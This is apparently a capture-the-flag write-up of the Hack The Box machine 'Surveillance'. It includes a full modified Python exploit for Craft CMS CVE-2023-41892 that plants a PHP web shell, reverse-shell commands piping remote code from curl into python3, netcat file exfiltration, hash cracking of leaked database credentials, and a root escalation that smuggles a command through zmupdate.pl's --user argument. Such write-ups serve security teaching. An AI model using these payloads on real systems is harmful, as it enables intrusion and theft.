---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Surveillance

## Enumeration

### Nmap

```
└─$ sudo nmap -sV -sC 10.129.177.124     
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-11 07:26 EST

Nmap scan report for 10.129.177.124

Host is up (0.073s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
```

## Web (TCP 80)

Add `surveillance.htb` to `/etc/hosts`

The web page is not really remarkable, just some static content.

### FFuf

```
ffuf -w ~/Tools/dnscan/subdomains-10000.txt -H "Host: FUZZ.surveillance.htb" -u http://surveillance.htb -r -fs 16230
```

FFuF found nothing

### Feroxbuster

```
└─$ feroxbuster -u http://surveillance.htb -r --insecure --filter-status 503 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___

by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://surveillance.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [503, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       63l      222w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

403      GET        7l       10w      162c http://surveillance.htb/images/
200      GET      109l      602w    50641c http://surveillance.htb/images/s1.png

200      GET      913l     1800w    17439c http://surveillance.htb/css/style.css

200      GET      108l      201w     1870c http://surveillance.htb/css/responsive.css

403      GET        7l       10w      162c http://surveillance.htb/js/
200      GET       46l       97w     1008c http://surveillance.htb/js/custom.js

403      GET        7l       10w      162c http://surveillance.htb/img/
200      GET       56l      237w    22629c http://surveillance.htb/images/w3.png

403      GET        7l       10w      162c http://surveillance.htb/css/
200      GET      114l      552w    42779c http://surveillance.htb/images/s2.png

200      GET       42l      310w    32876c http://surveillance.htb/images/favicon.png

200      GET      195l      842w    69222c http://surveillance.htb/images/w1.png

200      GET      148l      770w    71008c http://surveillance.htb/images/c2.jpg

200      GET       42l      310w    32876c http://surveillance.htb/images/home.png

200      GET       42l      243w    24617c http://surveillance.htb/images/s3.png

200      GET       89l      964w    72118c http://surveillance.htb/images/hero-bg.png

200      GET        4l       66w    31000c http://surveillance.htb/css/font-awesome.min.css

200      GET      105l      782w    62695c http://surveillance.htb/images/w2.png

200      GET      238l     1140w    90858c http://surveillance.htb/images/c1.jpg

200      GET        2l     1276w    88145c http://surveillance.htb/js/jquery-3.4.1.min.js

200      GET      764l     3911w   284781c http://surveillance.htb/images/why-bg.jpg

200      GET     1518l     8174w   619758c http://surveillance.htb/images/slider-img.png

200      GET     4436l    10973w   136569c http://surveillance.htb/js/bootstrap.js

200      GET    10038l    19587w   192348c http://surveillance.htb/css/bootstrap.css

200      GET      783l     4077w   330169c http://surveillance.htb/images/about-img.png

200      GET      475l     1185w    16230c http://surveillance.htb/
200      GET      129l     1074w    38436c http://surveillance.htb/admin/login
...
```

So there is some login after all. `http://surveillance.htb/admin/login` And that shows that it is Craft CMS.

### Version

On the bottom of the page

```
  <!-- footer section -->
  <section class="footer_section">
    <div class="container">
      <p>
        &copy; <span id="displayYear"></span> All Rights Reserved By
        SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>
      </p>
    </div>
  </section>
  <!-- footer section -->
```

So it is `4.4.14`

There are multiple vulnerabilities for this version

CVE-2023-41892

CVE-2023-40035

### Exploit

Looking at the exploits, we can stumble onto the following PoCs: 

* <https://github.com/zaenhaxor/CVE-2023-41892>
* <https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce>

I will use the former one as a template, but it needs to be modified first. I need to tailor it to my target.

* Update paths `<write filename="info:DOCUMENTROOT/cpresources/shell.php">`
* Get rid of the proxies
* Instead of executing a shell, tell it to download the shell and execute it

The PoC is as follows:

```python

import requests

import re

import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/cpresources/shell.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)    

def shell(cmd):
    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    print("[!] Please execute `nc -lvnp <port>` before running this script ...")
    if(len(sys.argv) != 4):
        print("Usage: python CVE-2023-41892.py <url> <local_ip> <local_port>")
        exit()
    else:
        url = sys.argv[1]
        ip = sys.argv[2]
        port = sys.argv[3]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        # Reverse shell
        print("[+] reverse shell is executing ...")
        rshell = f'curl {ip}:8000/shell.py|python3'
        shell(rshell)
```

NOTE: I am using a nice python TTY shell. <https://github.com/infodox/python-pty-shells>

That gives us shell with limited user. Let's look around.

## Escalate from www-data

By looking around, there are some interesting files.

### Database Credentials

```
$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/4.x/config/

# The application ID used to to uniquely store session and cache data, mutex locks, and more

CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# The secure key Craft will use for hashing and encrypting data

CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings

CRAFT_DB_DRIVER=mysql

CRAFT_DB_SERVER=127.0.0.1

CRAFT_DB_PORT=3306

CRAFT_DB_DATABASE=craftdb

CRAFT_DB_USER=craftuser

CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

# General settings (see config/general.php)
DEV_MODE=false

ALLOW_ADMIN_CHANGES=false

DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/
```

That gives us DB credentials. Let's try them.

```
mysql -h localhost -u craftuser -p craftdb
```

There is a password hash in the users table.

```
MariaDB [craftdb]> select * from users;
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
| id | photoId | active | pending | locked | suspended | admin | username | fullName  | firstName | lastName | email                  | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
|  1 |    NULL |      1 |       0 |      0 |         0 |     1 | admin    | Matthew B | Matthew   | B        | admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe | 2023-10-17 20:42:03 | NULL               | 2023-12-11 12:58:42     |                 1 | 2023-12-11 12:58:42  | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2023-10-17 20:38:29    | 2023-10-11 17:57:16 | 2023-12-11 12:58:42 |
+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
1 row in set (0.001 sec)
```

The hash: `$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe` So, hashcat it is....But it is taking forever. This leads nowhere. Let's look around a bit more.

### Backup Folder

There is a backup folder `~/html/craft/storage/backups` with a `surveillance--2023-10-17-202801--v4.4.14.sql.zip`.

Let's exfiltrate it using netcat

```
# On attacker

nc -lvnp 4444 > surveillance--2023-10-17-202801--v4.4.14.sql.zip
# on Victim

nc -vn 10.10.14.29 4444 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

Now unzip it and look inside.

There is sql backup, including records for user table.

```
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
```

Ok, this looks different. Quick check with cyberchef tells us it might me hash, based on the length. So, let's try to hashcat it.

```
# 1400 is mode for SHA2-256

hashcat bkp_hash -m 1400 /usr/share/wordlists/rockyou.txt
```

And that was success! `39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490`

### Getting in

But I cannot log into CMS admin, however, maybe it is a reused user password. From enumerating `/etc/passwd`, I know that there is user `matthew`.

So let's try SSH there.

```
# matthew:starcraft122490

ssh matthew@surveillance.htb 
```

And that works. Grab the user flag and go to town.

## Road to ROOT

### Linpeas

```
# On machine

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh

python3 -m http.server 8080
# On target

curl 10.10.14.146:8080/linpeas.sh | sh
```

### ZoneMinder Web

Linpeas found that there is ZoneMinder deployed here. That is some opensource camera monitoring system.

```
...
-rw-r--r-- 1 root root 1110 Oct 17 16:38 /etc/nginx/sites-available/zoneminder.conf

server {
    listen 127.0.0.1:8080;
    
    root /usr/share/zoneminder/www;
    
    index index.php;
...
```

It is only accessible from localhost, but that's not a problem. We can create a tunnel

```
ssh -L 8080:surveillance.htb:8080 matthew@surveillance.htb
```

Now, we can access the web and be greeted by a login page.

### ZoneMinder Database

Linpeas also found database credentials to ZoneMinder DB.

`/usr/share/zoneminder/www/api/app/Config/database.php`

```
...
        public $test = array(
                'datasource' => 'Database/Mysql',
                'persistent' => false,
                'host' => 'localhost',
                'login' => 'zmuser',
                'password' => 'ZoneMinderPassword2023',
                'database' => 'zm',
                'prefix' => '',
                //'encoding' => 'utf8',
        );
...
```

So, let's take a look into it.

```
mysql -h localhost -P 3306 -u zmuser -p zm
# ZoneMinderPassword2023
```

There is admin password hash.

```
ariaDB [zm]> select * from Users;
+----+----------+--------------------------------------------------------------+----------+---------+--------+--------+---------+----------+--------+---------+-----------+--------+--------------+------------+----------------+------------+----------+
| Id | Username | Password                                                     | Language | Enabled | Stream | Events | Control | Monitors | Groups | Devices | Snapshots | System | MaxBandwidth | MonitorIds | TokenMinExpiry | APIEnabled | HomeView |
+----+----------+--------------------------------------------------------------+----------+---------+--------+--------+---------+----------+--------+---------+-----------+--------+--------------+------------+----------------+------------+----------+
|  1 | admin    | $2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd. |          |       1 | View   | Edit   | Edit    | Edit     | Edit   | Edit    | Edit      | Edit   |              |            |              0 |          1 |          |
+----+----------+--------------------------------------------------------------+----------+---------+--------+--------+---------+----------+--------+---------+-----------+--------+--------------+------------+----------------+------------+----------+
1 row in set (0.000 sec)
```

So `hashcat` it is.

```
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
# $2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.
```

But that is *again* leading nowhere.

### Vulnerable version

Next, I check the deployed version

```
cat www/includes/config.php | grep Version
# define( 'ZM_VERSION', '1.36.32' );               // Version
```

And it is vulnerable, there is a CVE: CVE-2023-26035.

<https://github.com/rvizx/CVE-2023-26035>

Run the SSH tunnel

```
ssh -L 8080:surveillance.htb:8080 matthew@surveillance.htb
# matthew:starcraft122490
```

Run the exploit

```
# Listener: nc -lvnp 4444

python3 exploit.py -t http://localhost:8080/ -ip 10.10.14.146 -p 4444
```

That gives us the `zoneminder` shell.

## Escalate from zoneminder

### Enumeration

By running `sudo -l`, we can see the possibility to run pearl scripts.

```
User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

List the executable files by:

```
find /usr/bin -name zm[a-zA-Z]*.pl
```

Those are:

```
/usr/bin/zmtrack.pl
/usr/bin/zmpkg.pl
/usr/bin/zmcontrol.pl
/usr/bin/zmonvif-probe.pl
/usr/bin/zmvideo.pl
/usr/bin/zmtelemetry.pl
/usr/bin/zmsystemctl.pl
/usr/bin/zmonvif-trigger.pl
/usr/bin/zmwatch.pl
/usr/bin/zmdc.pl
/usr/bin/zmstats.pl
/usr/bin/zmtrigger.pl
/usr/bin/zmx10.pl
/usr/bin/zmfilter.pl
/usr/bin/zmcamtool.pl
/usr/bin/zmaudit.pl
/usr/bin/zmupdate.pl
/usr/bin/zmrecover.pl
```

So, let's just exfiltrate the files

```bash
# archive the zm-scripts

tar -cf /tmp/zm.tar zm[a-zA-Z]*.pl

# download the zm-scripts by SCP

scp matthew@surveillance.htb:/tmp/zm.tar zm.tar
# matthew:starcraft122490

# unarchive

tar -xf zm.tar
```

The bad thing is I cannot use the dangerous perl environment variables `PERL5OPT`, `PERL5DB`, `PERL5LIB`, `PERLLIB`. As there is no SETENV in `sudo`.

### Scanning the scripts

Ok, so let's look at the scripts. They all seems to be non-custom (there is copyright stuff there).

First interesting find is `zmsystemctl.pl` file.

```
use ZoneMinder;

my $command = $ARGV[0];

if ( (scalar(@ARGV) == 1)
     && ($command =~ /^(start|stop|restart|version)$/ )
){
    $command = $1;
} else {
    pod2usage(-exitstatus => -1);
}

my $path = qx(which systemctl);
chomp($path);

my $status = $? >> 8;
if ( !$path || $status ) {
    Fatal( "Unable to determine systemctl executable. Is systemd in use?" );
}

Info( "Redirecting command through systemctl\n" );
exec("$path $command zoneminder");
```

It is a wrapper around systemctl (but allows only subset of commands). Maybe other scripts are wrappers as well.

Let's search for ways how you can execute shell commands in perl. That is:

* `qx(COMMAND)`
* `exec(COMMAND)` So let's search for those things there.

#### [zmvideo.pl](http://zmvideo.pl)

First interesing hit is `zmvideo.pl`

Starting from line 243, there is:

```
  my $command = $Config{ZM_PATH_FFMPEG}
  . " -f concat -safe 0 -i $concat_list_file -c copy "
    .$Config{ZM_FFMPEG_OUTPUT_OPTIONS}
    ." '$video_file' > $Config{ZM_PATH_LOGS}/ffmpeg_${concat_name}.log 2>&1"
    ;
  Debug( $command."\n" );
  my $output = qx($command);
```

and, what's more, `concat_name` is parameter of the script. So, let's try it.

```
zoneminder@surveillance:/usr/bin$ sudo zmvideo.pl --concat=`echo HI` -e 1

Mpeg encoding is not currently enabled
```

Oh, no... it fails somewhere. Where? Oh, there is this check on line 123.

```
if ( ! $Config{ZM_OPT_FFMPEG} ) {
  print( STDERR "Mpeg encoding is not currently enabled\n" );
  exit(-1);
}
```

That's not the way (without messing up the config).

#### [zmupdate.pl](http://zmupdate.pl)

Now, let's try another one

At line 998 there is:

```
sub patchDB {
  my $dbh = shift;
  my $version = shift;

  my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ ) if $Config{ZM_DB_HOST};
  my $command = 'mysql';
  if ($super) {
    $command .= ' --defaults-file=/etc/mysql/debian.cnf';
  } elsif ($dbUser) {
    $command .= ' -u'.$dbUser;
    $command .= ' -p\''.$dbPass.'\'' if $dbPass;
  }
  if ( defined($portOrSocket) ) {
    if ( $portOrSocket =~ /^\// ) {
      $command .= ' -S'.$portOrSocket;
    } else {
      $command .= ' -h'.$host.' -P'.$portOrSocket;
    }
  } elsif ( $host ) {
    $command .= ' -h'.$host;
  }
  $command .= ' '.$Config{ZM_DB_NAME}.' < ';
  if ( $updateDir ) {
    $command .= $updateDir;
  } else {
    $command .= $Config{ZM_PATH_DATA}.'/db';
  }
  $command .= '/zm_update-'.$version.'.sql';

  print("Executing '$command'\n") if logDebugging();
  ($command) = $command =~ /(.*)/; # detaint
  my $output = qx($command);
```

It takes the user parameter and concat it to a command. Nice. Let's run it.

```
$ sudo /usr/bin/zmupdate.pl

Database already at version 1.36.32, update skipped.
```

Ok, specify the version (another parameter)

```
$ sudo /usr/bin/zmupdate.pl --version=666 

Initiating database upgrade to version 1.36.32 from version 666

WARNING - You have specified an upgrade from version 666 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort
```

To setup the shell….

```
# Prepare http server with shell

python3 -m http.server 80
# Run listener

python2 tcp_pty_shell_handler.py -b 0.0.0.0:443
```

Ok, cool, now for the payload!

```
sudo /usr/bin/zmupdate.pl --version=666 --user=`curl 10.10.14.200/tcp_pty_backconnect.py | python3)`
```

Which hits the reverse shell listener, but from the `zoneminder` user. Because the backticks gets executed right away. Let's try another one:

```
sudo /usr/bin/zmupdate.pl --version=666 --user=$(curl 10.10.14.200/tcp_pty_backconnect.py | python3)
```

The same story. Let's do this:

```
sudo /usr/bin/zmupdate.pl --version=666 --user='$(curl 10.10.14.200/tcp_pty_backconnect.py | python3)'
```

Which works, as the `'` make it so it does not execute right away, but the script eat it and unwrap it.

Cool! Press `enter` to proceed, press `y` to back it up, and catch the root shell.